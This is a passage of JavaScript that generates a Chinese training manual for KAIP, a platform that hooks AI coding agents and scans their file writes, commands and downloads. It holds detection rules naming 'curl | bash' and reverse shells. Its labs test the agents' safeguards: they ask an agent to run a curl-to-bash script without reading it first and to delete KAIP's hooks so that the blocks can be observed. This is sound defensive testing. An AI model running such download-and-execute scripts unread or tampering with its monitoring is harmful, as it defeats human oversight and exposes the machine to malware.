  H2("3.6 接入开发终端"),
  P("在控制台「接入部署」页复制带注册令牌的一键安装命令，在终端执行。安装程序自动识别本机的 Codex / OpenCode / WorkBuddy，完成注册、写入 hook / 插件、安装 kaip-watch；终端没有 Node.js 时自动从平台下载私有运行时。"),
  ...code([
    "# Windows（cmd）",
    "curl.exe -fsSLk -o \"%TEMP%\\kaip-install.ps1\" https://<平台>/dl/install.ps1 && powershell -NoProfile -ExecutionPolicy Bypass -File \"%TEMP%\\kaip-install.ps1\" -Server https://<平台> -Token <注册令牌>",
    "",
    "# Linux",
    "curl -fsSL https://<平台>/dl/install.sh | bash -s -- --server https://<平台> --token <注册令牌>",
  ]),
  ...table(["Agent", "安装后必做", "验证"], [
    ["Codex", "在**终端**运行一次 `codex`，在「Hooks need review」中信任 KAIP hook（桌面版不弹提示，Windows 上也需先在终端运行）", "`kaip verify` 显示「Codex ✔ 生效」"],
    ["WorkBuddy / CodeBuddy", "从托盘图标**完全退出**后重新打开", "「WorkBuddy ✔ 生效」"],
    ["OpenCode 1.x / 2.x", "重启 OpenCode；2.x 还需结束后台常驻的 `opencode-cli` 进程", "「OpenCode ✔ 生效」"],
  ], [20, 54, 26]),
  note("请使用默认安装（含 kaip-watch）。不装后台监控时，KAIP 被篡改后不会自动修复，升级复核也只在手动执行 `kaip verify` 时进行。", "warn"),
  H2("3.7 容器中的 OpenCode"),
  P("客户已用 docker compose 运行自己的 OpenCode 镜像时，无需更换或重建镜像：在其 compose 中为 OpenCode 服务加入 KAIP 配置，容器每次启动时由 KAIP 入口脚本完成注册（仅首次）、插件安装与后台监控，再执行原来的命令。"),
  ...code([
    "sudo mkdir -p /opt/kaip-client && curl -fsSL http://<平台>:8080/dl/kaip-client.tar.gz | sudo tar -xz -C /opt/kaip-client",
    "echo <注册令牌> > kaip_enroll_token.txt && chmod 600 kaip_enroll_token.txt",
    "docker compose -f docker-compose.yml -f docker-compose.kaip.yml up -d",
    ": > kaip_enroll_token.txt                      # 注册成功后清空（文件保留）",
  ]),
  ...bullets([
    "配置片段见离线包 `deploy/opencode-container/docker-compose.kaip.yml`：入口脚本、`KAIP_SERVER`、令牌 secret、客户端只读挂载、`kaip-state` 卷。`command` 必须是原镜像的 ENTRYPOINT + CMD。",
    "注册令牌以 compose secrets 文件挂载，不出现在容器环境变量与 `docker inspect` 中。",
    "`docker restart`、`down/up` 重建后自动恢复，无需重新注册；要求平台为 20261117 或更新版本。",
    "没有自己镜像的客户可直接用平台 compose 的 `kaip-opencode` 镜像（`docker compose --profile agent`）。",
  ]),
  H2("3.8 下载代理（可选）"),
  ...code([
    "sudo bash deploy/squid/install-squid.sh --kaip-syslog <平台 IP>          # KSE 服务器上执行",
    "bash client-proxy.sh http://<代理>:3128 kaip-proxy-ca.crt <平台 IP>        # Linux 终端",
    "powershell -ExecutionPolicy Bypass -File client-proxy.ps1 -Proxy http://<代理>:3128 -Ca kaip-proxy-ca.crt -NoProxy \"<平台 IP>\" -SystemProxy",
  ]),
  ...bullets([
    "需要支持 OpenSSL 的 Squid：Ubuntu 22.04+ / Debian 12 的 `squid-openssl`、RHEL 8+ 的 squid；Ubuntu 20.04 官方源的 squid 不能解密 HTTPS。",
    "KSE 控制台 **Settings → Logging → Syslog** 为 ICAP 模式添加 `udp://<平台>:5514`、格式 CEF，并勾选扫描结果事件，拦截记录才会出现在平台。",
    "`NO_PROXY` 必须包含平台地址；WorkBuddy 等 Electron 应用只认系统代理（Windows 加 `-SystemProxy`）。",
  ]),
  H2("3.9 安装验收"),
  ...table(["检查", "预期"], [
    ["`curl http://127.0.0.1:8080/healthz`", "`status` 为 ok，`engine` 为 kse"],
    ["控制台「安全概览」", "KSE 在线，病毒库为近期日期，许可证有效"],
    ["控制台「PoC 自检」", "8/8 通过（干净文件、EICAR、模型、Skill、数据集、恶意 URL、钓鱼 URL）"],
    ["终端 `kaip verify`", "每个 Agent「✔ 生效」并显示版本"],
    ["终端 `kaip selftest`、`kaip test`", "全部通过；EICAR 写入与高危命令被阻断"],
    ["控制台「终端与 Agent」", "终端在线，Agent 状态为生效"],
  ], [40, 60]),
  summary([
    "KSE 必须改为 TCP 监听、更新病毒库、开启防钓鱼；大文件扫描目录要加入允许扫描的目录。",
    "平台优先用离线包安装；Docker 方式数据在 kaip-data 卷。",
    "终端一键安装后，各 Agent 有各自的必做步骤（Codex 信任 hook、WorkBuddy 完全重启、OpenCode 重启）。",
    "容器中的 OpenCode 用 compose 片段接入，无需重建镜像。",
  ]),
  quiz([
    "安装 KSE 后平台报「无法连接 KSE: Connection refused」，最可能的原因是什么？",
    "Codex 安装 KAIP 后不拦截，`kaip verify` 显示「未信任」，应如何处理？",
    "客户的 OpenCode 容器以 `docker compose` 管理，接入 KAIP 需要重建镜像吗？令牌如何传入？",
    "离线包安装脚本在 Ubuntu 20.04（Python 3.8）上能否直接运行？为什么？",
  ]),
);

// ===== 4 配置 =====
add(
  moduleHead(4, "配置管理", "大多数配置在管理控制台中完成并实时下发终端；少数平台级参数在配置文件中，修改后需重启服务。"),
  objectives([
    "熟悉管理控制台各页面的用途；",
    "理解每一项防护策略，能根据阶段给出推荐值；",
    "修改平台参数与 KSE 关键配置；",
    "配置 SIEM 转发、凭据轮换与业务系统集成。",
  ]),
  H2("4.1 管理控制台"),
  ...table(["页面", "用途"], [
    ["安全概览", "在线终端、检出与阻断统计、Top 检出名称、扫描引擎状态（KSE 在线 / 离线、病毒库日期、判定缓存命中率）"],
    ["事件日志", "所有判定与告警事件，可按来源、判定、终端筛选，可导出"],
    ["终端与 Agent", "终端在线状态、客户端版本、IP、最后心跳、各 Agent 版本与防护状态；吊销与删除终端"],
    ["供应链扫描", "上传文件扫描、安全代下载、业务系统 / CI 集成示例（API Key 调用）"],
    ["隔离区", "被隔离的文件；放行（释放）或删除；放行区中已通过扫描的文件"],
    ["防护策略", "防护模式、处置规则、拦截点、哈希白名单、安装来源黑名单、受信任来源目录、已确认的工具"],
    ["接入部署", "终端注册令牌、Windows / Linux 一键安装命令、各 Agent 说明"],
    ["PoC 自检", "一键执行 8 个标准用例，验证引擎与判定链路"],
    ["系统设置", "扫描引擎、凭据（注册令牌、供应链 API Key）、SIEM / Syslog 转发、RAG 知识库对接"],
  ], [18, 82]),
  H2("4.2 防护策略"),
  P("策略在控制台「防护策略」中修改，保存后终端在下一次心跳（60 秒内）生效。"),
  ...table(["策略项", "选项（默认）", "说明与建议"], [
    ["防护模式", "阻断 / 审计（阻断）", "审计模式只告警不阻断，用于误报评估期；评估后改回阻断"],
    ["平台不可达时", "放行 / 阻断（放行）", "KSE 或平台不可用时的处置。放行不影响开发，但有防护空窗；高安全环境选阻断"],
    ["无法扫描（加密 / 损坏）", "按未放行处理（是）", "建议保持；加密压缩包无法确认安全"],
    ["KAIP 补充规则命中", "阻断 / 告警 / 关闭（阻断）", "`curl | bash`、反弹 shell、危险 pickle 等 AI 场景规则"],
    ["Agent 安装 / 下载命令", "允许并事后扫描 / 禁止 / 允许（允许并事后扫描）", "Agent 执行 `npm i`、`pip install`、`git clone` 等命令后，立即扫描新文件"],
    ["检出后隔离", "开启", "DETECT 的文件移入隔离区"],
    ["Hook 内联扫描上限", "50 MB", "超过的文件交给 kaip-watch 异步扫描"],
    ["写入 / 编辑文件前扫描", "开启", "D2 类防护（写入病毒文件）依赖此项"],
    ["执行命令前扫描脚本 / 模型", "开启", "执行脚本、加载模型前扫描文件"],
    ["会话启动时扫描 Skills", "开启", "Agent 会话开始时扫描已安装的 Skill"],
    ["URL 信誉检查", "开启", "需 KSE 开启 KSN 与防钓鱼"],
    ["自我保护（防篡改）", "开启", "阻止 Agent 篡改 KAIP"],
    ["自动修复", "开启", "被篡改后自动从平台恢复"],
    ["哈希白名单", "空", "按 SHA-256 放行确认无害的文件（误报处理）"],
    ["安装来源黑名单 / 白名单", "空", "按 URL 子串禁止或放行安装来源（如内部镜像）"],
    ["受信任来源目录", "WorkBuddy、Codex 官方插件目录", "目录内 KAIP 规则命中只告警；KSE 检出仍阻断"],
    ["已确认的工具", "空", "评估过的 Agent 新工具名，加入后不再提醒"],
  ], [24, 26, 50]),
  ...table(["阶段", "推荐配置"], [
    ["PoC / 演示", "阻断模式；其余保持默认"],
    ["试运行（误报评估）", "审计模式 1–2 周，收集事件；误报用哈希白名单或受信任来源目录处理"],
    ["生产", "阻断模式；按安全要求决定「平台不可达时」；开启 SIEM 转发；HTTPS"],
  ], [24, 76]),
  note("误报处理优先用最小范围的方法：单个文件用哈希白名单，整个官方来源用受信任来源目录。不要为消除误报关闭「KAIP 补充规则命中」或改为审计模式。", "tip"),
  H2("4.3 平台参数（/etc/kaip/kaip.env）"),
  P("修改后执行 `sudo systemctl restart kaip-platform` 生效。Docker 方式在 `deploy/.env` 与 `deploy/kaip.env` 中修改，再执行 `docker compose up -d`。"),
  ...table(["参数", "默认值", "说明"], [
    ["KAIP_KSE_MODE", "kse", "kse 为真实引擎；mock 为模拟引擎（仅演示）"],
    ["KAIP_KSE_URL", "http://127.0.0.1:1234", "KSE HTTP 地址；分机为 http://<KSE IP>:1234"],
    ["KAIP_KSE_TOKEN / KAIP_KSE_BEARER", "—", "KSE 启用认证时的令牌"],
    ["KAIP_KSE_TIMEOUT_MS", "600000", "单次扫描超时；大模型文件需要较长时间"],
    ["KAIP_KSE_SCAN_DIR", "/opt/kaspersky/scanqueue", "大文件扫描目录（平台侧）"],
    ["KAIP_KSE_SCAN_DIR_REMOTE", "空", "分机部署时 KSE 主机上的挂载点"],
    ["KAIP_KSE_SCANFILE_THRESHOLD", "26214400", "≥ 该大小（25 MB）走 scanfile；0 表示全部 scanmemory"],
    ["KAIP_MAX_UPLOAD_MB", "20480", "供应链上传大小上限"],
    ["KAIP_SYSLOG_LISTEN / KAIP_SYSLOG_PORT", "true / 5514", "接收 KSE（含 ICAP）Syslog"],
    ["KAIP_DATA_DIR", "/var/lib/kaip", "数据目录"],
    ["KAIP_RUNTIME_DIR", "/opt/kaip/runtime", "终端私有 Node.js 运行时目录"],
  ], [34, 24, 42]),
  H2("4.4 KSE 关键配置"),
  ...table(["位置", "配置", "建议值"], [
    ["Settings → Service", "监听地址", "同机 127.0.0.1:1234；分机为平台可访问的地址，防火墙只放行平台"],
    ["Settings → Service", "Locations where remote scanning is allowed", "同机 /opt/kaspersky/scanqueue；分机 /mnt/kaip-scanqueue"],
    ["Settings → Scanning", "Enable Phishing Protection / reputation checking", "开启"],
    ["ppl/kave.ini", "[Environment] KL_SCAN_LLM", "1"],
    ["Settings → Logging → Syslog（ICAP）", "事件 / 格式 / 目标", "扫描结果事件 / CEF / udp://<平台>:5514"],
    ["/etc/kavicapd.xml", "UseKSN、ScanTimeout", "KSN 不可达的隔离网络可设 UseKSN=0，避免扫描超时放行"],
  ], [28, 36, 36]),
  H2("4.5 SIEM 转发"),
  P("在「系统设置 → SIEM / Syslog 转发」中启用，填写服务器、端口、协议（UDP / TCP）、格式（CEF / JSON），可选「仅转发告警」，保存后用「测试」按钮发送测试事件。KUMA 等 SIEM 按 CEF 解析，字段包括终端、用户、Agent、对象、判定、检出名称、SHA-256、动作。"),
  H2("4.6 凭据管理"),
  ...table(["凭据", "用途", "管理"], [
    ["管理员密码", "登录控制台", "首次登录后立即修改；当前版本为单一管理员账号，限定少数人员使用并妥善保管"],
    ["终端注册令牌", "新终端注册", "「系统设置 → 凭据」轮换；轮换后已注册终端不受影响，只影响新注册"],
    ["供应链 API Key", "业务系统 / CI 调用供应链网关", "「系统设置 → 凭据」轮换；轮换后需更新调用方"],
    ["终端凭据", "终端与平台通信", "注册时生成，保存在 `~/.kaip/config.json`（600）；吊销终端即失效"],
  ], [20, 30, 50]),
  note("令牌与 API Key 只分发给实施人员，不要写进共享文档、聊天记录或脚本仓库；容器场景用 compose secrets 文件传入。", "warn"),
  H2("4.7 业务系统与 CI 集成"),
  P("业务系统、CI 流水线、知识库在入库前调用供应链网关，仅当返回 `action=allow` 时入库："),
  ...code([
    "curl -sk -H \"X-API-Key: <API_KEY>\" -F category=model -F file=@./model.pt https://<平台>/api/v1/supply/upload",
    "curl -sk -H \"X-API-Key: <API_KEY>\" -F category=rag -F forward_rag=true -F file=@./doc.pdf https://<平台>/api/v1/supply/upload",
    "curl -sk -H \"X-API-Key: <API_KEY>\" -H \"Content-Type: application/json\" -d '{\"url\":\"https://…/model.pt\",\"category\":\"model\"}' https://<平台>/api/v1/supply/fetch",
  ]),
  P("「系统设置 → RAG 知识库对接」配置 AnythingLLM 或通用 Webhook 后，`forward_rag=true` 的文档扫描通过即自动转发入库。安全代下载（`/supply/fetch`）适用于终端无法直连外网、模型与 Skill 统一经平台引入的场景。"),
  summary([
    "策略在控制台修改，60 秒内下发终端；平台参数在 kaip.env，修改后重启。",
    "试运行可用审计模式评估误报，生产使用阻断模式。",
    "误报用哈希白名单或受信任来源目录处理，不要关闭规则。",
    "ICAP 事件需在 KSE 控制台为 ICAP 模式配置 Syslog 并勾选扫描结果事件。",
  ]),
  quiz([
    "客户担心误报影响开发，试运行阶段应如何配置？发现误报后如何处理？",
    "修改 `KAIP_KSE_URL` 后需要做什么才能生效？",
    "某个 CI 流水线需要在模型入库前扫描，应使用什么凭据、调用哪个接口、依据什么字段决定是否入库？",
  ]),
);

// ===== 5 运维 =====
add(
  moduleHead(5, "运维与维护", "KAIP 的防护效果依赖 KSE 在线、病毒库及时、终端心跳正常。本模块给出日常巡检、升级、备份与日志的标准做法。"),
  objectives([
    "按日、周、月执行巡检；",
    "判断平台与 KSE 是否健康，识别防护空窗；",
    "完成平台、客户端与 Agent 升级后的复核；",
    "备份与恢复平台数据；",
    "定位日志，管理终端与隔离区。",
  ]),
  H2("5.1 巡检清单"),
  ...table(["频率", "检查项", "方法"], [
    ["每日", "KSE 在线、病毒库为当天或前一天", "控制台「安全概览 → 扫描引擎状态」"],
    ["每日", "有无判定为 ERROR 的事件", "「事件日志」按判定筛选 ERROR；出现即说明有防护空窗"],
    ["每日", "新的 DETECT / RISK / Tamper 事件", "「事件日志」；高危事件跟进到人"],
    ["每周", "离线终端、「升级待复核」或「未生效」的 Agent", "「终端与 Agent」"],
    ["每周", "隔离区新增文件", "「隔离区」；确认后删除或放行"],
    ["每周", "磁盘空间（数据目录、扫描目录）", "`df -h /var/lib/kaip /opt/kaspersky/scanqueue`"],
    ["每月", "备份可恢复、凭据轮换、离线终端吊销", "见 5.5、4.6、5.7"],
  ], [12, 40, 48]),
  H2("5.2 健康检查"),
  ...code([
    "systemctl is-active kaip-platform kavhttpd kavicapd",
    "curl -s http://127.0.0.1:8080/healthz",
    "ss -ltn | grep -E ':1234 |:1344 '                         # KSE 是否在监听",
    "curl -s http://127.0.0.1:1234/api/v3.0/basesdate          # 病毒库日期",
  ]),
  note("`/healthz` 只说明平台进程正常和配置的引擎类型，不检测 KSE 是否可用。曾出现 KSE 进程仍在、但不再监听 1234 的情况，期间 healthz 正常，所有扫描都是 ERROR 并按 fail_open 放行。判断 KSE 是否可用，以控制台「扫描引擎状态」和 1234 端口为准。", "risk"),
  H2("5.3 病毒库与判定缓存"),
  ...bullets([
    "确认 KSE 自动更新周期已开启；隔离网络使用离线许可证与内网更新源 / 本地目录更新。",
    "病毒库更新后判定缓存自动失效，终端在 60 秒心跳内同步；终端每 15 分钟的全量扫描会按新病毒库重新判定，更新后出现一波集中扫描属于正常现象。",
    "首页可看缓存命中率；命中率长期为 0 说明病毒库版本获取异常，检查 KSE 状态。",
  ]),
  H2("5.4 升级"),
  ...table(["对象", "方法", "升级后检查"], [
    ["KAIP 平台（原生）", "解压新离线包，执行 `sudo bash install-offline.sh`（同样的参数）；保留配置与数据", "healthz、PoC 自检；终端客户端随后自动升级"],
    ["KAIP 平台（Docker）", "`docker load` 新镜像，`docker compose up -d`", "`docker compose ps` 为 healthy"],
    ["终端客户端", "无需操作：平台升级后，kaip-watch 在心跳中发现版本落后并自动升级；也可执行 `kaip sync` 立即同步", "控制台中客户端版本更新；无篡改告警"],
    ["AI Agent", "按 Agent 自身方式升级", "`kaip verify`；状态「升级待复核」在真实使用一次后恢复「生效」"],
    ["KSE", "按 KSE 官方文档", "1234 / 1344 监听、病毒库日期、PoC 自检"],
  ], [20, 50, 30]),
  note("升级前先备份（5.5）。只在终端侧替换客户端文件不是升级，会被当作篡改恢复回平台版本。", "warn"),
  H2("5.5 备份与恢复"),
  P("需要备份的内容：`/etc/kaip/kaip.env`（配置）与 `/var/lib/kaip/`（数据库、隔离区、放行区）。为保证数据库一致，备份时短暂停止服务："),
  ...code([
    "# 原生安装",
    "sudo systemctl stop kaip-platform",
    "sudo tar -czf kaip-backup-$(date +%F).tgz /etc/kaip /var/lib/kaip",
    "sudo systemctl start kaip-platform",
    "",
    "# Docker 方式（项目名 kaip，数据卷 kaip_kaip-data）",
    "docker compose stop kaip",
    "docker run --rm -v kaip_kaip-data:/d -v \"$PWD\":/b --entrypoint tar kaip-platform:1.0.0 -czf /b/kaip-data-$(date +%F).tgz -C /d .",
    "docker compose start kaip",
  ]),
  P("恢复：停止服务，解压备份覆盖 `/etc/kaip` 与 `/var/lib/kaip`，确认属主为 `kaip`、数据目录权限 700，再启动服务。终端凭据保存在数据库中，恢复后已注册终端无需重新注册。"),
  note("备份中含终端凭据与隔离样本，按敏感数据保管，限制访问。", "warn"),
  H2("5.6 日志"),
  ...table(["对象", "位置 / 命令"], [
    ["平台（原生）", "`journalctl -u kaip-platform`"],
    ["平台（Docker）", "`docker compose logs kaip`"],
    ["终端客户端", "`~/.kaip/logs/kaip.log`（hook 判定、插件加载、监控与自愈）"],
    ["容器中的 OpenCode", "容器内 `/root/.kaip/logs/kaip.log`；`docker compose logs <服务名>`"],
    ["KSE", "按 KSE 文档；ICAP 日志通过 Syslog 发往平台"],
    ["Squid", "`/var/log/squid/access.log`（每次下载的结果）、`cache.log`（ICAP 错误）"],
  ], [26, 74]),
  H2("5.7 终端管理"),
  ...bullets([
    "终端每 60 秒心跳；约 10 分钟无心跳显示「离线」。离线通常是关机或 kaip-watch 未运行，终端上执行 `kaip status` 检查。",
    "不再使用的终端在「终端与 Agent」中**吊销**：吊销后该终端无法调用平台，按离线策略处理。",
    "终端重装系统后重新执行一键安装即可注册为新终端，旧记录吊销后删除。",
  ]),
  H2("5.8 隔离区"),
  ...bullets([
    "DETECT 的文件进入隔离区，以混淆方式保存，避免被宿主机杀毒二次处理或误执行。",
    "确认为误报时「放行」，并把 SHA-256 加入哈希白名单，避免再次拦截；确认为恶意时「删除」。",
    "隔离区可能有真实恶意样本，导出与销毁按客户安全制度执行。",
  ]),
  H2("5.9 容量与性能"),
  ...bullets([
    "扫描 1 GB 文件约需 2 GB 内存；同时扫描多个大文件时按并发量预留内存。",
    "判定缓存显著降低重复扫描；Hook 内联扫描上限之外的大文件由 kaip-watch 异步扫描，不阻塞 Agent。",
    "扫描目录中的临时文件扫描后立即删除；数据目录主要随事件与隔离文件增长。",
  ]),
  summary([
    "每日看 KSE 状态与 ERROR 事件——ERROR 意味着防护空窗。",
    "healthz 不代表 KSE 可用。",
    "平台升级后终端自动升级；Agent 升级后用 kaip verify 复核。",
    "备份 /etc/kaip 与 /var/lib/kaip，备份时短暂停服。",
  ]),
  quiz([
    "控制台显示 healthz 正常，但事件日志中出现大量 ERROR，说明什么？首先检查什么？",
    "平台升级到新版本后，终端需要逐台重新安装吗？",
    "隔离区中的文件确认为误报，除了放行还应做什么？",
  ]),
);

// ===== 6 卸载 =====
add(
  moduleHead(6, "卸载与清理", "卸载按「终端 → 容器 → 代理 → 服务器」的顺序进行，删除数据前先导出需要保留的报告与事件。"),
  objectives([
    "区分普通卸载与彻底卸载；",
    "清理容器、下载代理与服务器上的 KAIP 组件；",
    "知道卸载为什么必须由用户本人执行。",
  ]),
  H2("6.1 终端"),
  ...table(["命令", "效果"], [
    ["`kaip uninstall`", "结束 kaip-watch，移除各 Agent 的 KAIP 接入与监控服务，保留 `~/.kaip`（凭据、日志），之后可 `kaip install` 重新接入"],
    ["`kaip uninstall --purge`", "彻底卸载：另外移除 PATH 设置、安装时的配置备份 `*.kaip.bak`，删除整个 `~/.kaip`（含私有运行时与本地隔离区）"],
  ], [28, 72]),
  ...bullets([
    "两种方式都会先向平台上报 `KAIP:Client.Uninstalled` 事件。",
    "**由 AI Agent 执行卸载会被防篡改阻断**，卸载必须由用户在终端中手动执行。",
    "卸载只删除 KAIP 写入的 hook / 插件条目，不会用备份覆盖 Agent 配置；Codex 的 `[features] hooks = true` 会保留。",
    "卸载后重启正在运行的 Agent，并在控制台吊销该终端。",
    "PATH 中没有 `kaip` 时：Linux `node ~/.kaip/client/bin/kaip.js uninstall --purge`；Windows `node \"%USERPROFILE%\\.kaip\\client\\bin\\kaip.js\" uninstall --purge`。",
  ]),
  H2("6.2 容器"),
  ...code([
    "# compose 接入：去掉 KAIP 配置后重建，并删除 KAIP 状态卷",
    "docker compose -f docker-compose.yml up -d --force-recreate && docker volume rm <项目名>_kaip-state",
    "",
    "# docker exec 在线加装的容器",
    "docker exec <容器名> node /root/.kaip/client/bin/kaip.js uninstall --purge",
  ]),
  H2("6.3 下载代理"),
  ...code([
    "bash client-proxy.sh --remove                       # Linux 终端",
    "powershell -File client-proxy.ps1 -Remove           # Windows 终端（恢复系统代理、删除 CA）",
    "sudo systemctl disable --now squid && sudo apt-get remove -y squid-openssl",
    "sudo rm -rf /etc/squid/certs /var/spool/squid/ssl_db   # 代理 CA 私钥一并销毁",
  ]),
  H2("6.4 服务器"),
  ...code([
    "# 原生安装",
    "sudo systemctl disable --now kaip-platform",
    "sudo rm -f /etc/systemd/system/kaip-platform.service && sudo systemctl daemon-reload",
    "sudo rm -rf /opt/kaip /etc/kaip /var/lib/kaip && sudo userdel kaip",
    "",
    "# Docker 方式（连同数据卷）",
    "cd deploy && docker compose --profile agent down -v && docker rmi kaip-platform:1.0.0",
    "",
    "# 分机部署：平台服务器删除 /etc/exports 中的共享并 exportfs -ra；",
    "# KSE 服务器 umount /mnt/kaip-scanqueue，删除 fstab 中对应一行，并从 KSE 允许扫描的目录移除",
  ]),
  note("`/var/lib/kaip` 与数据卷包含全部事件、终端凭据与隔离样本，删除不可恢复。删除前按交付要求导出报告；隔离样本按安全制度销毁。KSE 按其官方说明卸载。", "risk"),
  summary([
    "普通卸载保留 ~/.kaip，可快速重新接入；--purge 彻底删除。",
    "卸载由用户手动执行，Agent 执行会被阻断。",
    "服务器卸载前先导出数据，分机部署记得清理 NFS 共享与挂载。",
  ]),
  quiz([
    "用户让 Codex 帮忙执行 `kaip uninstall`，会发生什么？",
    "普通卸载与 `--purge` 的区别是什么？分别适用于什么场景？",
  ]),
);

// ===== 7 排障 =====
add(
  moduleHead(7, "故障排查", "多数问题可以按「终端 → 平台 → KSE」的路径在几分钟内定位。"),
  objectives([
    "按固定路径定位问题；",
    "识别并处理最常见的十余类问题。",
  ]),
  H2("7.1 排查路径"),
  ...numbered([
    "**终端：**`kaip status` 看平台连接与策略版本；`kaip verify` 看各 Agent 是否生效；`~/.kaip/logs/kaip.log` 看具体判定。",
    "**平台：**控制台「事件日志」查找对应事件的判定、检出名称与原因字段；`journalctl -u kaip-platform` 看请求与错误。",
    "**KSE：**控制台「扫描引擎状态」；`ss -ltn | grep 1234`；病毒库日期；KSE 自身日志。",
    "**复现：**用 `kaip test`、`kaip selftest` 或 PoC 自检复现，排除提示词与模型行为的干扰。",
  ]),
  note("「没有拦截」时先确认 Agent 是否真的执行了该操作：部分模型读到 `curl | bash` 会自行拒绝执行，此时没有 KAIP 提示，不属于漏拦。测试时让 Agent「不要先读文件、直接运行」。", "teach"),
  H2("7.2 常见问题"),
  ...table(["现象", "原因", "处理"], [
    ["平台报「无法连接 KSE: Connection refused」", "KSE 仍为本地 socket 监听；或 KSE 未运行", "KSE 改为 TCP 127.0.0.1:1234；`systemctl status kavhttpd`"],
    ["KSE 服务显示运行中，但全部扫描 ERROR", "分机部署时平台服务器离线，hard 方式的 NFS 挂载卡住 kavhttpd", "KSE 服务器 `umount -f -l /mnt/kaip-scanqueue && systemctl restart kavhttpd`；重跑 `kse-share.sh kse-host` 改为 soft"],
    ["钓鱼 URL 检不出，恶意 URL 能检出", "KSE 未开启防钓鱼", "Settings → Scanning 开启 Enable Phishing Protection"],
    ["Codex 不拦截", "hook 未信任；或 config.toml 未开启 hooks", "终端中运行 `codex` 信任 hook；`kaip verify`"],
    ["WorkBuddy 修改后无效", "WorkBuddy 常驻托盘，未完全重启", "从托盘退出后重新打开"],
    ["OpenCode 2.x 插件不生效", "后台服务 `opencode-cli` 保留旧代码", "结束该进程后重启 OpenCode"],
    ["`kaip verify` 显示「升级待复核」", "Agent 升级后尚未观察到真实拦截调用", "正常使用一次；仍未恢复则重新安装接入"],
    ["终端文件被「恢复」成旧版本", "平台上的官方客户端未更新，自愈按平台版本恢复", "先升级平台，再让终端同步"],
    ["普通卸载后 hook 又被装回", "旧版客户端卸载时未结束监控进程", "`kaip sync` 后重新卸载，或 `--purge`"],
    ["经代理访问 HTTPS 报证书错误", "终端未信任代理 CA，或程序自带信任库", "重新执行 client-proxy 脚本并新开终端；Java 等需导入自带信任库"],
    ["经代理下载全部失败", "KSE ICAP 服务 kavicapd 未运行（Squid 设计为 ICAP 不可用即阻断）", "`systemctl enable --now kavicapd`"],
    ["经代理下载的病毒偶发未拦截", "KSE 与 KSN 断开或重连期间，ICAP 扫描超时后原样放行", "保证 KSE 到 KSN 网络稳定；隔离网络设 UseKSN=0；终端 KAIP 写入 / 执行时仍会扫描"],
    ["控制台看不到代理拦截事件", "ICAP Syslog 未配置、目标不是本平台、未勾选扫描结果事件，或 UDP 5514 未放行", "KSE 控制台修正 Syslog；KSE 服务器 `tcpdump -U -A udp port 5514` 确认发出"],
    ["compose 中的 OpenCode 提示未注册且缺少令牌", "首次启动时令牌文件为空，或 kaip-state 卷是新的", "写入令牌后重启容器"],
    ["平台容器 unhealthy", "宿主机扫描目录对 UID 10001 不可写", "`install -d -o 10001 -g 10001 -m 0775 /opt/kaspersky/scanqueue`"],
    ["服务器上的测试样本「消失」", "服务器 KESL 实时防护抢先处理", "在 KSC 策略中为扫描目录与数据目录添加排除"],
  ], [28, 34, 38]),
  summary([
    "排查路径：终端（verify、日志）→ 平台（事件、journal）→ KSE（端口、病毒库）。",
    "Agent 自行拒绝执行不是漏拦；测试时明确要求直接运行。",
    "大部分「不生效」来自 Agent 未重启或未信任 hook。",
  ]),
  quiz([
    "用户反馈 WorkBuddy 安装 KAIP 后不拦截，你会按什么顺序排查？",
    "经代理下载 EICAR 偶尔返回 200，可能的原因与缓解办法是什么？",
  ]),
);

// ===== 8 实验 =====
const lab = (no, title, goal, env, stepsList, expect) => [
  H2(`实验 ${no}  ${title}`),
  ...table(["目标", "环境"], [[goal, env]], [55, 45]),
  ...numbered(stepsList),
  note(expect, "tip"),
];
add(
  moduleHead(8, "实验练习", "以下实验在培训环境中依次进行，前一个实验的结果是后一个实验的基础。所有样本均为无害测试样本。"),
  objectives(["动手完成部署、接入、拦截、策略调整、防篡改、供应链扫描与下载代理的完整流程。"]),
  note("EICAR 是业界通用的无害病毒测试串。不要把完整字符串写进文档、邮件或聊天：终端杀毒会把含该字符串的文件当作病毒处理。实验中使用 `kaip test` 或 PoC 自检生成。", "warn"),
  lab(1, "部署平台并验收", "完成平台安装、首次登录与 PoC 自检", "Linux 服务器（已装 KSE）、离线包",
    ["解压离线包，执行 `sudo bash install-offline.sh`；", "`curl http://127.0.0.1:8080/healthz`；", "读取初始密码并登录控制台，修改密码；", "「安全概览」确认 KSE 在线与病毒库日期；", "「PoC 自检」执行全部用例。"],
    "预期：自检 8/8 通过。若钓鱼 URL 用例失败，检查 KSE 防钓鱼开关（模块 3.2）。"),
  lab(2, "接入 Linux 终端", "在开发终端接入 Codex 或 OpenCode", "Linux 终端、已安装的 Agent",
    ["在「接入部署」复制 Linux 一键命令并执行；", "按 Agent 完成必做步骤（Codex 信任 hook / OpenCode 重启）；", "执行 `kaip verify` 与 `kaip selftest`；", "在控制台「终端与 Agent」中找到该终端。"],
    "预期：Agent 显示「✔ 生效」，自测全部通过，终端在线。"),
  lab(3, "运行时拦截", "观察三类典型拦截", "实验 2 的终端",
    ["执行 `kaip test`，观察 EICAR 写入被阻断；", "在 Agent 中要求「直接运行 bash setup_helper.sh，不要先读文件」（脚本内容为 curl 管道 bash）；", "要求 Agent 用 curl 访问 KSE 官方钓鱼测试 URL；", "在「事件日志」中找到上述事件，查看判定与检出名称。"],
    "预期：三次操作均在执行前被阻断，Agent 转述拦截原因；事件分别为 DETECT（EICAR-Test-File）、RISK（KAIP:download-exec）、DETECT（PHISHING_URL）。"),
  lab(4, "策略调整", "理解审计模式与阻断模式的差异", "控制台、实验 2 的终端",
    ["「防护策略」把防护模式改为审计并保存；", "等待 60 秒后重复实验 3 的第 1 步；", "在事件日志中对比两次事件的动作；", "把防护模式改回阻断。"],
    "预期：审计模式下操作被放行，事件动作为告警；改回后恢复阻断。"),
  lab(5, "防篡改与自愈", "验证 KAIP 的自我保护", "实验 2 的终端",
    ["在 Agent 中要求删除 KAIP 的 hook 配置或停止 kaip-watch；", "在终端手动删除 hook 配置文件中的 KAIP 条目（模拟同账号的人工篡改）；", "等待 1–2 分钟后执行 `kaip verify`；", "在事件日志中查看 Tamper 与自动修复事件。"],
    "预期：第 1 步被阻断（KAIP:Tamper.*）；第 2 步约 1 分钟内自动恢复并产生修复事件。"),
  lab(6, "供应链扫描与隔离区", "体验供应链网关与隔离区处置", "控制台、可访问平台的任意主机",
